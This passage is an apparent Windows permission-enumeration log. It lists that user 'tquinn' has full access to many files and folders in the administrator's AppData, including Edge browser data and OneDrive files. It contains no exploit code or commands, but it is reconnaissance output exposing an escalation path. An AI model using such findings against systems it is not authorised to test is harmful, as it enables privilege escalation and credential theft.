     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgePushStorageWithWinRt\LOG": tquinn [Allow: AllAccess]                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgePushStorageWithWinRt": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgePushStorageWithWinRt\LOCK": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgePushStorageWithConnectTokenAndKey\LOG.old": tquinn [Allow: AllAccess]                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgePushStorageWithConnectTokenAndKey\LOG": tquinn [Allow: AllAccess]                                              
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgePushStorageWithConnectTokenAndKey": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgePushStorageWithConnectTokenAndKey\LOCK": tquinn [Allow: AllAccess]                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeHubAppUsage\EdgeHubAppUsageSQLite.db-journal": tquinn [Allow: AllAccess]                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeHubAppUsage": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeHubAppUsage\EdgeHubAppUsageSQLite.db": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeEDrop\EdgeEDropSQLite.db-journal": tquinn [Allow: AllAccess]                                                   
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeEDrop": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeEDrop\EdgeEDropSQLite.db": tquinn [Allow: AllAccess]                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeCoupons\coupons_data.db\000003.log": tquinn [Allow: AllAccess]                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeCoupons\coupons_data.db\CURRENT": tquinn [Allow: AllAccess]                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeCoupons\coupons_data.db\LOCK": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeCoupons\coupons_data.db\LOG": tquinn [Allow: AllAccess]                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeCoupons\coupons_data.db\LOG.old": tquinn [Allow: AllAccess]                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeCoupons\coupons_data.db": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\EdgeCoupons\coupons_data.db\MANIFEST-000001": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Download Service\EntryDB\LOCK": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Download Service\EntryDB\LOG": tquinn [Allow: AllAccess]                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Download Service\EntryDB": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Download Service\EntryDB\LOG.old": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\DawnCache\index": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\DawnCache\data_3": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\DawnCache\data_2": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\DawnCache\data_1": tquinn [Allow: AllAccess]                                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\DawnCache": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\DawnCache\data_0": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\databases\Databases.db-journal": tquinn [Allow: AllAccess]                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\databases": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\databases\Databases.db": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\commerce_subscription_db\LOG.old": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\commerce_subscription_db\LOG": tquinn [Allow: AllAccess]                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\commerce_subscription_db": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\commerce_subscription_db\LOCK": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache\js": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache\js\index": tquinn [Allow: AllAccess]                                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache\js\index-dir": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache\js\index-dir\the-real-index": tquinn [Allow: AllAccess]                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache\wasm": tquinn [Allow: AllAccess]                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache\wasm\index": tquinn [Allow: AllAccess]                                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache\wasm\index-dir": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Code Cache\wasm\index-dir\the-real-index": tquinn [Allow: AllAccess]                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Cache\Cache_Data\data_0": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Cache\Cache_Data\data_1": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Cache\Cache_Data\data_2": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Cache\Cache_Data\data_3": tquinn [Allow: AllAccess]                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Cache\Cache_Data": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Cache\Cache_Data\index": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\BudgetDatabase\LOG.old": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\BudgetDatabase\LOG": tquinn [Allow: AllAccess]                                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\BudgetDatabase": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\BudgetDatabase\LOCK": tquinn [Allow: AllAccess]                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\AutofillStrikeDatabase\LOG.old": tquinn [Allow: AllAccess]                                                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\AutofillStrikeDatabase\LOG": tquinn [Allow: AllAccess]                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\AutofillStrikeDatabase": tquinn [Allow: AllAccess]                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\AutofillStrikeDatabase\LOCK": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\AssistanceHome\AssistanceHomeSQLite-journal": tquinn [Allow: AllAccess]                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\AssistanceHome": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\AssistanceHome\AssistanceHomeSQLite": tquinn [Allow: AllAccess]                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Asset Store\assets.db\000003.log": tquinn [Allow: AllAccess]                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Asset Store\assets.db\CURRENT": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Asset Store\assets.db\LOCK": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Asset Store\assets.db\LOG": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Asset Store\assets.db\LOG.old": tquinn [Allow: AllAccess]                                                          
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Asset Store\assets.db": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Default\Asset Store\assets.db\MANIFEST-000001": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GraphiteDawnCache\data_0": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GraphiteDawnCache\data_1": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GraphiteDawnCache\data_2": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GraphiteDawnCache\data_3": tquinn [Allow: AllAccess]                                                                       
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GraphiteDawnCache": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GraphiteDawnCache\index": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GrShaderCache\data_0": tquinn [Allow: AllAccess]                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GrShaderCache\data_1": tquinn [Allow: AllAccess]                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GrShaderCache\data_2": tquinn [Allow: AllAccess]                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GrShaderCache\data_3": tquinn [Allow: AllAccess]                                                                           
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GrShaderCache": tquinn [Allow: AllAccess]                                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\GrShaderCache\index": tquinn [Allow: AllAccess]                                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Nurturing\campaign_history": tquinn [Allow: AllAccess]                                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Nurturing": tquinn [Allow: AllAccess]                                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Nurturing\campaign_history-journal": tquinn [Allow: AllAccess]                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\ShaderCache\data_0": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\ShaderCache\data_1": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\ShaderCache\data_2": tquinn [Allow: AllAccess]                                                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\ShaderCache\data_3": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\ShaderCache": tquinn [Allow: AllAccess]                                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\ShaderCache\index": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData\topTraffic_170540185939602997400506234197983529371": tquinn [Allow: AllAccess]                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData\topTraffic": tquinn [Allow: AllAccess]                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData\synchronousLookupUris": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData\edgeSettings_2.0-0": tquinn [Allow: AllAccess]                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData\edgeSettings": tquinn [Allow: AllAccess]                                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData\customSynchronousLookupUris_0": tquinn [Allow: AllAccess]                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData\customSynchronousLookupUris": tquinn [Allow: AllAccess]                                             
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData\customSettings_F95BA787499AB4FA9EFFF472CE383A14": tquinn [Allow: AllAccess]                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\SmartScreen\RemoteData\customSettings": tquinn [Allow: AllAccess]                                                          
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\BrowserMetrics-spare.pma": tquinn [Allow: AllAccess]                                                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\CrashpadMetrics-active.pma": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\First Run": tquinn [Allow: AllAccess]                                                                                      
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\FirstLaunchAfterInstallation": tquinn [Allow: AllAccess]                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Last Browser": tquinn [Allow: AllAccess]                                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Last Version": tquinn [Allow: AllAccess]                                                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Local State": tquinn [Allow: AllAccess]                                                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data": tquinn [Allow: AllAccess]                                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Edge\User Data\Variations": tquinn [Allow: AllAccess]                                                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\GameDVR": tquinn [Allow: AllAccess]                                                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\GameDVR\KnownGameList.bin": tquinn [Allow: AllAccess]                                                                                     
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\input\en-US": tquinn [Allow: AllAccess]                                                                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\input\en-GB": tquinn [Allow: AllAccess]                                                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\ie4uinit-UserConfig.log": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\ie4uinit-ClearIconCache.log": tquinn [Allow: AllAccess]                                                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\brndlog.txt": tquinn [Allow: AllAccess]                                                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer": tquinn [Allow: AllAccess]                                                                                           
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\brndlog.bak": tquinn [Allow: AllAccess]                                                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\IECompatData": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\IECompatData\iecompatdata.xml": tquinn [Allow: AllAccess]                                                               
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\CacheStorage\edbtmp.log": tquinn [Allow: AllAccess]                                                                     
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\CacheStorage\edbres00002.jrs": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\CacheStorage\edbres00001.jrs": tquinn [Allow: AllAccess]                                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\CacheStorage\edb.log": tquinn [Allow: AllAccess]                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\CacheStorage\edb.chk": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\CacheStorage": tquinn [Allow: AllAccess]                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Internet Explorer\CacheStorage\.inUse": tquinn [Allow: AllAccess]                                                                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\12_All_Video.wpl": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\11_All_Pictures.wpl": tquinn [Allow: AllAccess]                                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\10_All_Music.wpl": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\09_Music_played_the_most.wpl": tquinn [Allow: AllAccess]                                       
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\08_Video_rated_at_4_or_5_stars.wpl": tquinn [Allow: AllAccess]                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\07_TV_recorded_in_the_last_week.wpl": tquinn [Allow: AllAccess]                                
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\06_Pictures_rated_4_or_5_stars.wpl": tquinn [Allow: AllAccess]                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\05_Pictures_taken_in_the_last_month.wpl": tquinn [Allow: AllAccess]                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\04_Music_played_in_the_last_month.wpl": tquinn [Allow: AllAccess]                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\03_Music_rated_at_4_or_5_stars.wpl": tquinn [Allow: AllAccess]                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\02_Music_added_in_the_last_month.wpl": tquinn [Allow: AllAccess]                               
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7": tquinn [Allow: AllAccess]                                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\Media Player\Sync Playlists\en-GB\00011FE7\01_Music_auto_rated_at_5_stars.wpl": tquinn [Allow: AllAccess]                                 
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\Resources.pri": tquinn [Allow: AllAccess]                                                                                        
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive": tquinn [Allow: AllAccess]                                                                                                    
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\OneDrive.exe": tquinn [Allow: AllAccess]                                                                                         
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\setup\logs\Install-PerUser_2023-09-25_111805_1e08-48c.log": tquinn [Allow: AllAccess]                                            
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\setup\logs\Install_2023-09-25_111802_1a38-19ac.log": tquinn [Allow: AllAccess]                                                   
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\setup\logs\Uninstall_2023-10-19_153118_758-18ec.log": tquinn [Allow: AllAccess]                                                  
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\setup\logs\Uninstall_2023-10-19_172028_e88-190c.log": tquinn [Allow: AllAccess]                                                  
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\setup\logs": tquinn [Allow: AllAccess]                                                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\setup": tquinn [Allow: AllAccess]                                                                                              
     File Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\setup\ECSConfig.json": tquinn [Allow: AllAccess]                                                                                 
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\logs\Common": tquinn [Allow: AllAccess]                                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\logs\Personal": tquinn [Allow: AllAccess]                                                                                      
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm": tquinn [Allow: AllAccess]                                                                               
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\zh-TW": tquinn [Allow: AllAccess]                                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\zh-CN": tquinn [Allow: AllAccess]                                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\tr": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\sv": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\ru": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\pt-PT": tquinn [Allow: AllAccess]                                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\pt-BR": tquinn [Allow: AllAccess]                                                                         
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\pl": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\nl": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\ko": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\ja": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\it": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\hu": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\fr": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\es": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\adm\de": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\af": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\am-ET": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\amd64": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ar": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\arm64": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\as-IN": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\az-Latn-AZ": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\be": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\bg": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\bn-BD": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\bn-IN": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\bs-Latn-BA": tquinn [Allow: AllAccess]                                                                        
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ca": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ca-Es-VALENCIA": tquinn [Allow: AllAccess]                                                                    
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\cs": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\cy-GB": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\da": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\de": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\el": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\en": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\en-GB": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\en-US": tquinn [Allow: AllAccess]                                                                             
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\es": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\et": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\eu": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\fa": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\fi": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\fil-PH": tquinn [Allow: AllAccess]                                                                            
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\fr": tquinn [Allow: AllAccess]                                                                                
     Folder Permissions "c:\users\administrator\AppData\Local\Microsoft\OneDrive\19.043.0304.0013\ga-IE": tquinn [Allow: AllAccess]                                                                             
